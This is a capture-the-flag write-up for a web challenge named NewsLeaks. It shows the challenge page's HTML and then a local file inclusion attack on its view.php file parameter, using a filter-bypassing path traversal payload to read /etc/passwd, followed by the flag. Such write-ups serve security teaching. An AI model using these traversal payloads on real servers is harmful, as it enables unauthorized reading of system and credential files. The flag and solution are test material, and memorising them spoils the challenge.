# NewsLeaks
## Description
> Keep scrolling, but something feels... off. Can you figure it out?
>
> https://newsleaks.h7tex.com/


![image](https://github.com/user-attachments/assets/4bffe0bb-dcbf-4a29-9107-6d3698ee181b)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Newspaper Viewer</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container">
        <h1>Online Newspaper Viewer</h1>
        <iframe id="newspaperFrame" src="view.php?file=newspaper1.html"></iframe>
        <br>
        <button onclick="prevNewspaper()">Previous</button>
        <button onclick="nextNewspaper()">Next</button>
    </div>

    <script>
        let currentFile = 1;
        const maxFiles = 3;

        function nextNewspaper() {
            if (currentFile < maxFiles) {
                currentFile++;
            } else {
                currentFile = 1; // Loop back to the first newspaper
            }
            document.getElementById('newspaperFrame').src = `view.php?file=newspaper${currentFile}.html`;
        }

        function prevNewspaper() {
            if (currentFile > 1) {
                currentFile--;
            } else {
                currentFile = maxFiles; // Loop back to the last newspaper
            }
            document.getElementById('newspaperFrame').src = `view.php?file=newspaper${currentFile}.html`;
        }
    </script>
</body>
</html>
```


![image](https://github.com/user-attachments/assets/08e01cc1-5437-4988-9e68-fae958a5efb0)
```
https://newsleaks.h7tex.com/view.php?file=.../etc/passwd
news/..etc/passwd not found
```

https://newsleaks.h7tex.com/view.php?file=...//...//...//...//etc/passwd
![image](https://github.com/user-attachments/assets/51b92f98-7771-4c5c-9015-28a171b2ef84)

## Flag
```
H7CTF{54n1t1z3_L0c4l_F1l3_1nclusi0n}
```
